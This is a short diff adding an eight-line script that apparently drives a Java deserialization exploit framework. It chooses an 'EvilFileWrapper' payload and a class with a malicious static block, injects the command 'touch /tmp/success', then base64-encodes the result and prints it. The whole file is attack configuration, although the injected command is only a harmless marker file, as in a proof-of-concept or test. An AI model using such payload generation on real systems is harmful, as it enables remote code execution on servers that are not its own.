@@ -1,0 +1,8 @@
+use payload EvilFileWrapper
+use bullet ClassWithEvilStaticBlock
+set type class
+set body "touch /tmp/success"
+set classname utils.MachineUtils.getIP
+set encoder base64
+set output console
+run
